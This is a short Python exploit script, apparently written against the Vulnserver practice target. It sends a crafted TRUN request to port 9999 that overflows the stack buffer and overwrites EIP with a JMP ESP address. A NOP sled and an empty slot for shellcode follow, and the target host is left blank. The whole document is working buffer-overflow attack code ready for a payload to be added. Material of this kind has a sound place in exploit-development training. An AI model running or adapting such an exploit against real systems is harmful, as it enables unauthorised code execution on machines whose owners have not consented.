#!/usr/bin/python
import socket

payload = ""

RHOST = ""

RPORT = 9999
# Address of JMP ESP
EIP = "\xaf\x11\x50\x62"
buffer = ""
buffer += "TRUN /.:/"
buffer += ("\x90" * 2003)
buffer += EIP
buffer += ("\x90" * 16)
buffer += payload
buffer += "\x90" * (5000 - 2003 - len(EIP) - 16 - len(payload))
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*] Connecting to " + RHOST + " on port " + str(RPORT))
connection.connect((RHOST, RPORT))
connection.recv(1024)
print("[*] Sending exploit")
connection.send(buffer)
connection.close()
print("[*] Exploit had been sent")
